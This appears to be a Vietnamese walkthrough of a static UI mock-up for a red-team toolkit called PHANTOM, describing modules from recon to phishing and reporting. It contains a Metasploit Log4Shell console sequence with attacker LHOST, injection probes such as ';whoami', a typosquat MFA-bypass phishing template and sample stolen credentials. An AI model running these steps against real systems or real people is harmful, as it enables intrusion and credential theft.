# PHANTOM v2.5.0 — Offensive Security Suite
## Giải thích chi tiết các tính năng (Tiếng Việt)

> Đây là giao diện UI demo của một bộ công cụ bảo mật tấn công (offensive security), được viết bằng HTML/CSS/JS thuần túy — không có backend thật. Giao diện mô phỏng luồng làm việc của một red team pentest chuyên nghiệp.

---

## Tổng quan giao diện

Giao diện được chia làm 4 khu vực chính:

| Khu vực | Mô tả |
|---|---|
| **Left Nav Bar** | Thanh icon dọc bên trái — chuyển đổi giữa các module |
| **Sidebar** | Hiển thị Targets, Sessions, Reports |
| **Workspace** | Vùng làm việc chính — nội dung từng module |
| **Right Panel (Inspector)** | Thông tin nhanh về target đang chọn + tiến độ scan |

--- 

## Sidebar — 3 tab chính

### Tab Targets (Mục tiêu)
- **Active Targets**: Danh sách IP/domain đang nhắm tới (192.168.1.0/24, target.corp.local, ...)
- **Wordlists**: File danh sách từ dùng để brute force (rockyou.txt 14.3M dòng, dirbuster-med.txt, sqli-payloads.txt)
- **Credentials**: Lưu trữ thông tin đăng nhập đã tìm được (admin:admin123 — VALID, root:toor — INVALID)
- **CVE Database**: Danh sách lỗ hổng CVE đang theo dõi (Log4Shell 10.0, MS17-010 9.8, CVE-2024-38812 7.2)

### Tab Sessions (Phiên kết nối)
- Hiển thị các shell đang mở tới máy nạn nhân
- **Session #1** — 192.168.1.10, loại `meterpreter`, chạy với quyền `NT AUTHORITY\SYSTEM` (quyền cao nhất trên Windows)
- **Session #2** — 192.168.1.20, loại `shell`, user `www-data` (web server Linux)
- **Session #3** — 192.168.1.50, loại `ssh`, đang Idle

### Tab Reports (Báo cáo)
- Danh sách báo cáo đã tạo: pentest-final.pdf, exec-summary.docx, findings-raw.json

---

## Module 1 — Recon / OSINT 🔍

**Mục đích**: Thu thập thông tin về target trước khi tấn công (passive/active recon).

### Các công cụ trong toolbar:
- **Run All**: Chạy toàn bộ quá trình recon tự động
- **DNS Enum**: Liệt kê DNS records (A, MX, NS, SPF, DMARC, Zone Transfer)
- **Subdomain Brute**: Brute force tìm subdomain ẩn
- **Google Dork**: Tìm kiếm thông tin nhạy cảm qua Google
- **Shodan**: Tra cứu thông tin server trên Shodan
- **HIBP**: Kiểm tra email có bị lộ trong data breach (Have I Been Pwned)
- **Export JSON**: Xuất kết quả ra file JSON

### Thông tin hiển thị:
| Card | Nội dung |
|---|---|
| **IP & Network** | IP chính, IPv6, ASN, ISP, vị trí địa lý, hosting provider |
| **DNS Records** | Bản ghi A/MX/NS/SPF/DMARC — phát hiện Zone Transfer bị lộ |
| **Breach Data** | Dữ liệu bị rò rỉ từ LinkedIn 2021, RockYou2024, Adobe 2013 — kèm credential rõ ràng |
| **Technology Stack** | Web server (Apache 2.4.51), Backend (PHP 7.4), Framework (Laravel), DB (MySQL 5.7), CMS (WordPress), CDN, SSL |
| **Subdomains Found** | 47 subdomain — hiển thị status HTTP, đánh dấu đỏ những cái nguy hiểm (admin, jenkins, vpn, git) |

> **Điểm đáng chú ý**: Zone Transfer bị bật → attacker có thể dump toàn bộ DNS records. DMARC `p=none` → dễ spoofing email.

---

## Module 2 — Network Scanner 📡

**Mục đích**: Quét mạng để tìm host đang hoạt động và các port mở (tương tự Nmap).

### Toolbar:
- **Full Scan**: Quét toàn diện (tất cả port, OS detection, service version)
- **Quick SYN**: Quét nhanh dùng SYN packet (ít để lại log hơn)
- **UDP Scan**: Quét UDP port
- **OS Detect**: Nhận diện hệ điều hành dựa vào TTL và fingerprint
- **Svc Version**: Phát hiện phiên bản dịch vụ đang chạy
- **Scripts**: Chạy Nmap NSE scripts để kiểm tra lỗ hổng cơ bản

### Kết quả:
- **Discovered Hosts**: Danh sách host tìm được với IP, hostname, OS
- Màu port: 🟢 Xanh = open, 🟡 Vàng = filtered, 🔴 Đỏ nhấp nháy = có lỗ hổng đã biết
- **Scan Output**: Log terminal chi tiết — hiển thị EternalBlue trên port 445, Log4Shell trên 8080, MySQL cho phép anonymous auth

> **Kết quả nguy hiểm trong demo**: EternalBlue (MS17-010) trên DC01, Log4Shell trên web server, Telnet trên 192.168.1.30 dùng plaintext.

---

## Module 3 — Vulnerability Scanner 🛡️

**Mục đích**: Hiển thị danh sách lỗ hổng bảo mật đã phát hiện, phân loại theo mức độ nghiêm trọng.

### Phân loại severity:
| Mức độ | Màu | Số lượng |
|---|---|---|
| CRITICAL | Tím | 3 |
| HIGH | Đỏ | 7 |
| MEDIUM | Vàng | 12 |
| LOW | Xanh nhạt | 5 |
| **Tổng** | | **27** |

### Các lỗ hổng nổi bật trong demo:
1. **Log4Shell (CVE-2021-44228)** — CRITICAL 10.0: RCE qua JNDI injection trong Apache Log4j. Exploit qua bất kỳ input nào được log.
2. **EternalBlue (MS17-010)** — CRITICAL 9.8: SMBv1 RCE, được WannaCry dùng, chưa vá trên DC01.
3. **SQL Injection** — HIGH 8.1: UNION-based SQLi tại `/api/v1/login`, dump được DB.
4. **Stored XSS** — HIGH 7.5: Trong trường comment blog, execute JS trong context admin.
5. **IDOR** — MEDIUM 5.4: `/api/v1/users/{id}` không kiểm tra quyền, bất kỳ user nào cũng đọc được profile người khác.
6. **Default Credentials** — MEDIUM 6.2: Jenkins dùng `admin:admin`.

### Panel Details (bên phải):
- Hiển thị CVSS score dạng vòng tròn (ring chart)
- Chi tiết CVE: ngày publish, affected version, exploitability, patch
- PoC code mẫu
- Nút action: **Launch Exploit Module**, **Open in Exploit Engine**, **Send to Report**

---

## Module 4 — Exploit Engine ⚡

**Mục đích**: Chạy exploit vào target sau khi đã xác định lỗ hổng — tích hợp Metasploit workflow.

### Toolbar:
- Chọn exploit module (vd: `exploit/multi/misc/log4shell_header_injection`)
- Set RHOSTS (target), LHOST (máy attacker), LPORT
- **Launch**, **Generate Payload**, **Listener**

### Panel Modules:
Danh sách exploit có sẵn theo category:
- RCE (Remote Code Execution)
- Privilege Escalation
- Web Exploits
- SMB Exploits (EternalBlue)

### Exploit Console (log thực tế demo):
```
use exploit/multi/misc/log4shell_header_injection
set RHOSTS 192.168.1.20
set LHOST 10.10.14.5
→ Sending payload via X-Api-Version header
→ JNDI callback received
→ Meterpreter session 1 opened!
→ uid=1001(tomcat)
→ ★ UID=0 — Root shell obtained!
```

> Kết quả: Lấy được root shell trên web server thông qua Log4Shell.

---

## Module 5 — Post-Exploitation 💀

**Mục đích**: Sau khi có shell, thực hiện các bước thu thập dữ liệu và di chuyển ngang trong mạng.

### Toolbar actions:
| Nút | Tác dụng |
|---|---|
| **Hashdump** | Dump NTLM hash từ SAM database hoặc LSASS |
| **Mimikatz** | Trích xuất password cleartext từ bộ nhớ Windows |
| **Screenshot** | Chụp màn hình máy nạn nhân |
| **Keylogger** | Ghi lại phím bấm |
| **Webcam** | Mở webcam nạn nhân |
| **Pass-the-Hash** | Xác thực bằng hash NTLM mà không cần crack |
| **Pivot / SOCKS** | Tạo tunnel để tấn công mạng bên trong |

### 3 Panel chính:

**File Browser**: Duyệt file hệ thống nạn nhân
- Thấy được: `passwords.txt`, `SAM`, `NTDS.dit` (18MB — chứa toàn bộ hash AD), `secrets.kdbx`, `backup_creds.json`

**Process List**: Danh sách tiến trình đang chạy
- `lsass.exe` — được đánh dấu ★ vì chứa credential trong RAM
- Mỗi process có thể: **mig** (migrate shellcode vào), **kill**, **dump**
- Phát hiện process nghi ngờ: `svchost32.exe` (tên giả mạo)

**Lateral Movement**: Di chuyển sang máy khác trong mạng
- Dùng PsExec, WMI, Pass-the-Hash (PTH), SSH
- SOCKS5 proxy: `127.0.0.1:1080`
- Port forwarding: `L:3389 → 192.168.1.10:3389` (tunnel RDP)
- Credential harvest log: 14 hashes, cleartext `P@ssw0rd!` từ WDigest, Kerberos ticket krbtgt

---

## Module 6 — Intruder / Fuzzer 🔨

**Mục đích**: Brute force / fuzzing HTTP request — tương tự Burp Suite Intruder.

### 4 chế độ tấn công:
| Mode | Mô tả |
|---|---|
| **Sniper** | Thử từng payload vào 1 vị trí duy nhất |
| **Battering Ram** | Dùng cùng payload cho tất cả vị trí cùng lúc |
| **Pitchfork** | Dùng nhiều wordlist song song (1:1 mapping) |
| **Cluster Bomb** | Thử mọi tổ hợp có thể — chậm nhất nhưng toàn diện nhất |

### Request Template:
Hiển thị HTTP request mẫu với vị trí inject được đánh dấu bằng `§`:
```
POST /api/v1/login
{"username": §admin§, "password": §password§}
```

### Payload Sets:
- Position 1: `usernames.txt` (847 entries)
- Position 2: `top-500-passwords.txt`
- Tổng combinations: **423,500**
- Throttle: 50 req/s (adaptive)

### Attack Results:
Bảng kết quả hiển thị: số thứ tự, username, password, HTTP status, response length, thời gian phản hồi.
- Hàng màu xanh = **HIT** (đăng nhập thành công 200 OK)
- Tìm được: `admin:admin123` và `administrator:P@ssw0rd!`

---

## Module 7 — Web App Scanner 🌐

**Mục đích**: Crawl và phân tích toàn bộ ứng dụng web — tương tự Burp Suite Pro.

### Toolbar:
- **Spider**: Tự động crawl tất cả endpoint
- **Repeater**: Gửi lại request thủ công và xem response
- **Decoder**: Encode/decode dữ liệu
- **Comparer**: So sánh 2 response
- **Sequencer**: Phân tích độ ngẫu nhiên của token/session ID
- **WAF Detect**: Phát hiện Web Application Firewall đang dùng
- **Import HAR**: Import traffic đã capture từ browser

### 3 Panel:

**Site Map (87 endpoints)**:
- `/api/v1/login` → SQLi!
- `/api/v1/users` → IDOR!
- `/blog/post` → XSS!
- `/upload` → File Upload vulnerability
- `/.git/config` → **EXPOSED!** (lộ source code)
- `/wp-login.php` → WordPress login

**Repeater**:
- Gửi request GET `/api/v1/users/1` → response trả về password_hash và role của user
- Điều này confirm lỗi IDOR

**Decoder / Encoder**:
- Base64 Encode/Decode
- URL Encode/Decode
- HTML Decode
- MD5, SHA256
- JWT Decode: parse header/payload của JWT token
- WAF: phát hiện Cloudflare, gợi ý bypass qua Unicode hoặc chunked Transfer-Encoding

---

## Module 8 — SQLi / XSS / Injection 💉

**Mục đích**: Tự động hóa kiểm tra các loại injection attack — tích hợp sqlmap workflow.

### Các loại injection được kiểm tra:
| Loại | Mô tả |
|---|---|
| **SQLi** | SQL Injection (Union-based, Blind Time, Boolean) |
| **NoSQLi** | NoSQL Injection (MongoDB `$where`) |
| **XSS** | Cross-Site Scripting (Stored, Reflected) |
| **SSTI** | Server-Side Template Injection (`{{7*7}}` → 49) |
| **LFI/RFI** | Local/Remote File Inclusion (path traversal → `/etc/passwd`) |
| **CMDi** | Command Injection (`;whoami` → www-data) |
| **XXE** | XML External Entity Injection (OOB via DTD) |

### Kết quả trong demo (8 confirmed):
- SQLi trên `username` → dump toàn bộ DB corp_db
- LFI trên `file` → đọc `/etc/passwd`
- CMDi trên `ping_host` → RCE với user www-data
- SSTI trên `template` → confirmed code execution

### Dump Output console:
Log chi tiết từng bước: phát hiện → xác nhận → dump dữ liệu → hiển thị kết quả rõ ràng.

---

## Module 9 — Forensics 🔬

**Mục đích**: Phân tích file, artifact, binary — hỗ trợ điều tra số (digital forensics).

### Tính năng chính:
- **Hex Viewer**: Xem nội dung file dưới dạng hex dump với highlight các byte quan trọng (string, null byte)
- Phân tích file metadata
- Trích xuất artifact từ memory dump, disk image
- Phân tích tiến trình và file hệ thống

> Module này thường dùng trong blue team / incident response, nhưng trong context red team cũng dùng để phân tích binary target hoặc reverse firmware.

---

## Module 10 — Malware Sandbox 🦠

**Mục đích**: Chạy và phân tích malware trong môi trường cô lập (sandbox).

### Tính năng:
- Thực thi file đáng ngờ trong sandbox an toàn
- Theo dõi behavior: network connection, file I/O, registry changes, process creation
- Phát hiện C2 (Command & Control) callback
- Phân tích static (strings, imports) và dynamic (runtime behavior)
- Tạo báo cáo IOC (Indicators of Compromise)

---

## Module 11 — Network Sniffer 🕸️

**Mục đích**: Bắt và phân tích gói tin mạng real-time — tương tự Wireshark.

### Toolbar:
- Chọn interface: `eth0` hoặc `tun0` (VPN tunnel)
- **Start Capture / Stop**
- **ARP Spoof**: Giả mạo ARP để làm Man-in-the-Middle
- **MITM**: Bật chế độ tấn công man-in-the-middle
- **Filter**: BPF filter (`tcp port 80 or port 443`)
- **Save PCAP**: Lưu file capture để phân tích sau

### Packet Capture (1,842 packets):
Bảng hiển thị từng gói tin: số thứ tự, timestamp, source, destination, protocol, length, info.

Màu protocol: 🟢 TCP, 🔵 UDP, 🟡 DNS, 🟣 HTTP, 🩷 ARP

### Gói tin nổi bật trong demo:
- **Packet #3**: `POST /beacon HTTP/1.1` — **C2 traffic!** (máy nạn nhân đang gửi beacon về C2 server)
- **Packet #4**: DNS query tới `c2.evil.com` — resolve về IP của attacker
- **Packet #7**: SMB NTLMSSP — capture được NTLM challenge/response
- **Packet #8**: Kerberos AS-REP — TGT được cấp phát
- **Packet #9**: POST `/gate.php` tới `45.33.32.156` — encrypted C2 payload

### Protocol Stats:
- TCP: 62% | DNS: 18% | HTTP: 12% | ARP: 5% | Other: 3%

### Alerts:
- 🔴 **C2 Beacon Detected**: 192.168.1.20 → 45.33.32.156:80 (periodic, encrypted)
- 🟡 **NTLM Hash Captured**: Responder bắt được NTLMv2 hash

---

## Module 12 — Hash / Password Cracking 🔐

**Mục đích**: Crack password hash bằng nhiều phương pháp khác nhau — tích hợp Hashcat.

### Attack Modes:
| Mode | Mô tả |
|---|---|
| **Wordlist** | Thử từng từ trong wordlist (rockyou.txt) |
| **Rules** | Apply biến thể rules vào wordlist (thêm số, ký tự đặc biệt) |
| **Bruteforce** | Thử tất cả tổ hợp ký tự theo mask |
| **Combo** | Kết hợp nhiều wordlist |
| **Rainbow Table** | Tra cứu trong bảng hash precomputed |
| **Online Lookup** | Tra cứu hash trên các trang online |

### Hash Identifier:
Tự động nhận diện loại hash:
- `$2y$10$...` → **bcrypt** (rất chậm, ~145 H/s ngay cả với GPU RTX 3090)
- `aad3b435...` → **NTLM empty hash** (password trống)
- 32 ký tự hex → NTLM / MD5

### Kết quả demo (3/14 cracked):
- NTLM empty hash → `""` (password trống)
- `d7b5e5f4...` → **P@ssw0rd!** (wordlist attack)
- `5f4dbc1d...` → **admin123** (wordlist attack)

### Hashcat Output:
- GPU: RTX 3090, 24GB VRAM
- Speed NTLM: **14,823 MH/s** (14 tỷ hash/giây)
- Speed bcrypt: 145 H/s (bị giới hạn bởi cost factor)

---

## Module 13 — Phishing / SE Toolkit 🎣

**Mục đích**: Tạo và quản lý chiến dịch phishing / social engineering.

### Toolbar:
- **Launch Campaign**: Bật campaign đã cấu hình
- **Clone Site**: Clone website thật để làm landing page giả
- **Email Template**: Tạo mẫu email giả mạo
- **Evilginx Setup**: Cấu hình reverse proxy để bypass 2FA
- **Macro Generator**: Tạo Office macro độc hại (phishing qua file đính kèm)

### Campaigns (3 chiến dịch demo):

**1. Corp VPN Phish** (ACTIVE):
- 42 employee bị nhắm
- Gửi: 42/42
- Mở email: **28 (66%)**
- Click link: **19 (45%)**
- Credential harvested: **11 (26%)** — kết quả rất cao

**2. IT Password Reset** (DRAFT):
- Template: Microsoft 365 clone
- Target: accounting-dept.csv

**3. HR Benefits Link** (COMPLETE):
- Thu được 7 credentials

### Email Template Builder:
- From giả: `it-support@corp-secure.io` (typosquat — thêm chữ "secure")
- Subject: `⚠️ Action Required: Verify Your VPN Access`
- Landing page: VPN portal clone qua Evilginx (reverse proxy bypass MFA)
- Kỹ thuật urgency: "24 giờ để xác minh"

### Harvested Credentials (bảng kết quả):
| Time | Email | Password | IP |
|---|---|---|---|
| 09:12 | alice@corp.local | Spring2024! | 10.0.0.45 |
| 09:15 | bob@corp.local | Corp@1234 | 10.0.0.82 |
| 09:22 | ceo@corp.local | Secr3t!Pass | 10.0.0.11 |
| 09:31 | it.admin@corp.local | ADm1n#2024 | 10.0.0.5 |
| 09:44 | finance@corp.local | Money$$123 | 10.0.0.92 |

---

## Module 14 — Cloud Security ☁️

**Mục đích**: Audit bảo mật môi trường cloud (AWS, GCP, Azure) và container.

### Toolbar:
- Chọn provider: **AWS** / **GCP** / **Azure**
- **Audit All**: Scan toàn bộ resources
- **K8s Audit**: Kiểm tra Kubernetes cluster
- **Docker Scan**: Scan Docker images tìm CVE
- **IAM Enum**: Liệt kê và phân tích IAM permissions

### AWS Resources (14 issues):
| Resource | Vấn đề |
|---|---|
| S3: `prod-backup-2024` | 🔴 **Public read ACL** — chứa file nhạy cảm |
| IAM: `legacy-admin-user` | 🔴 `AdministratorAccess` + không có MFA + access key 847 ngày |
| EC2: `web-server-01` | 🟡 SSH mở ra `0.0.0.0/0` (toàn internet) |
| RDS: `mysql-prod-01` | 🟡 Publicly accessible |
| Security Group: `default-sg` | 🔴 All ports mở ra `0.0.0.0/0` |

### Kubernetes Audit:
- K8s version 1.24.0 (outdated)
- API Server: **Anonymous auth bật** — không cần authenticate để query API
- Dashboard bị expose ra internet
- RBAC: `cluster-admin` gán cho default service account
- Pod `nginx-pod`: `privileged: true` → container escape possible
- Secrets hardcode trong ENV variables: `DB_PASSWORD=prod_secret123`

### Docker Image Scan:
- `nginx:1.19` → **47 CVEs, 12 CRITICAL**
- `node:14-alpine` → 23 CVEs
- `postgres:13` → 0 critical CVEs

### IAM Enumeration:
- `legacy-admin`: AdministratorAccess (quá rộng)
- `dev-role`: S3:*, EC2:*, RDS:* (quá nhiều quyền)
- `ci-cd-role`: `IAM:PassRole` — có thể escalate privilege
- Tìm thấy `AWS_SECRET_KEY` trong file `.env` trên S3
- Hardcoded token trong GitHub Actions YAML

### Compliance scores:
- CIS AWS Benchmark: **34%** 🔴
- PCI DSS: **58%** 🟡
- HIPAA: **62%** 🟡

---

## Module 15 — Report Builder 📄

**Mục đích**: Tạo báo cáo pentest chuyên nghiệp và export ra nhiều định dạng.

### Toolbar:
- **Build Report**: Tổng hợp tất cả findings vào report
- **Export PDF / DOCX / HTML**
- Templates có sẵn: **Pentest Standard**, **Executive Summary**, **Bug Bounty**
- **Auto-Fill from Findings**: Tự động điền dữ liệu từ các module khác

### Report Sections (có thể bật/tắt và kéo thả để sắp xếp):
1. ✅ Executive Summary
2. ✅ Scope & Methodology
3. ✅ Risk Summary
4. ✅ Technical Findings
5. ✅ Evidence & PoC
6. ✅ Remediation Steps
7. ❌ Appendix / Raw Data (tắt mặc định)

### Branding:
- Client name: Corp, Inc.
- Author: Red Team Alpha
- Classification: CONFIDENTIAL

### Report Preview (xem trực tiếp):
Hiển thị preview của báo cáo ngay trong giao diện — với định dạng chuyên nghiệp, ngày tháng, tên tác giả, nội dung Executive Summary.

---

## Module 16 — AI Assistant 🤖

**Mục đích**: Trợ lý AI tích hợp để hỗ trợ phân tích và đề xuất trong quá trình pentest.

### Giao diện chat:
- Conversation dạng chat (user / assistant)
- AI phân tích kết quả scan, đề xuất exploit tiếp theo
- Giải thích CVE, cách hoạt động của lỗ hổng
- Gợi ý payload, bypass technique
- Tổng hợp findings để viết report

> Đây là AI assistant tích hợp sâu vào workflow — không phải chatbot độc lập mà có context về target đang pentest.

---

## Module 17 — Collaboration (Team) 👥

**Mục đích**: Hỗ trợ làm việc nhóm real-time — nhiều operator cùng pentest 1 target.

### Operators (3 người):
| Avatar | Tên | Trạng thái | Vai trò |
|---|---|---|---|
| RA | RedAlpha | 🟢 Online — Post-Exploit | Lead |
| SX | ShadowX | 🟢 Online — SQLi | Member |
| GH | GhostHunter | 🟢 Online — Recon | Member |

### Activity Log (tự động):
- RedAlpha opened session #1 on 192.168.1.10
- ShadowX confirmed SQLi on /api/v1/login
- GhostHunter added 47 subdomains to targets
- RedAlpha dumped NTLM hashes (14 found)
- ShadowX cracked P@ssw0rd! from dump

### Team Chat:
```
RedAlpha  09:12: Got root on .20 via Log4Shell. Moving to DC next.
ShadowX   09:15: SQLi confirmed on login endpoint. Union-based, DB = corp_db.
GhostHunter 09:18: Found exposed .git repo — cloning now.
RedAlpha  09:31: 🎉 DOMAIN ADMIN on DC01! Full golden ticket ready.
ShadowX   09:33: Admin hash cracked → P@ssw0rd!. Also got 11 phishing creds.
```

---

## Right Panel — Inspector

Panel cố định bên phải, luôn hiển thị thông tin tổng quan về target đang chọn:

### Selected Target:
- Hostname, IP, Status, OS, Open Ports, Risk Score: **CRITICAL (94/100)**

### Scan Progress (tiến độ từng bước):
| Giai đoạn | Tiến độ |
|---|---|
| Recon | 100% ✅ |
| Port Scan | 100% ✅ |
| Vuln Scan | 78% 🔵 |
| Exploitation | 100% ✅ |
| SQLi/XSS Fuzz | 34% 🟡 |
| Hash Cracking | 21% 🔵 |
| Phishing | 100% ✅ |

### Quick Stats:
| Metric | Số lượng |
|---|---|
| Vulnerabilities | 27 🔴 |
| Critical RCE | 3 🟣 |
| Active Sessions | 3 🟢 |
| Subdomains | 47 🔵 |
| Creds Cracked | 14 🟡 |
| Phish Creds | 11 🩷 |

### Quick Actions:
- Exploit Engine, Post-Exploitation, Ask AI Assistant, Build Report, Team Collaboration

---

## Status Bar — Thanh trạng thái dưới cùng

Hiển thị real-time summary ở cuối màn hình:

```
Module: Recon / OSINT | Target: target.corp.local | Sessions: 3 active | Vulns: 27 | Creds: 14 cracked | Phishing: 11 harvested | Tunnel: TUN0 UP | 2026-06-02 09:14:41
```

Đồng hồ tự cập nhật mỗi giây bằng JavaScript.

---

## Luồng Pentest Điển Hình trong PHANTOM

```
1. RECON        → Thu thập thông tin: IP, subdomain, tech stack, breach data
       ↓
2. SCANNER      → Quét mạng: tìm host, port, OS, service version
       ↓
3. VULN SCAN    → Phân tích lỗ hổng: CVE, CVSS score, PoC
       ↓
4. EXPLOIT      → Khai thác: Log4Shell → Meterpreter → Root shell
       ↓
5. POST-EXPLOIT → Hashdump, Mimikatz, File browser, Lateral movement
       ↓
6. INTRUDER     → Brute force thêm credential
       ↓
7. WEBAPP       → Spider, Repeater, Decoder, WAF bypass
       ↓
8. SQLi / XSS   → Dump DB, RCE qua CMDi, LFI
       ↓
9. SNIFFER      → Bắt C2 traffic, NTLM hash
       ↓
10. CRACKING    → Crack hash thu được
       ↓
11. PHISHING    → Social engineering thu thêm credential
       ↓
12. CLOUD       → Audit S3, IAM, K8s misconfiguration
       ↓
13. FORENSICS   → Phân tích artifact, binary
       ↓
14. REPORT      → Xuất báo cáo pentest chuyên nghiệp
       ↓
15. AI + COLLAB → Hỗ trợ phân tích và làm việc nhóm
```
  
---

## Tóm tắt kỹ thuật

| Công nghệ | Chi tiết |
|---|---|
| **Frontend** | HTML5, CSS3 (variables, grid, animation), JavaScript ES6 thuần |
| **Font** | JetBrains Mono (code), Rajdhani (title) |
| **Theme** | Dark hacker terminal — màu chủ đạo: `#00d4ff` (cyan), `#ff3b5c` (red), `#00e5a0` (green) |
| **Architecture** | Single HTML file — không có backend, toàn bộ là UI demo static |
| **Interactivity** | `switchModule()` JS function để chuyển đổi giữa 17 module |
| **Responsive** | Không responsive — thiết kế cố định cho màn hình desktop lớn |

---

*File được tạo tự động từ việc phân tích `phantoma.html` — PHANTOM v2.5.0*
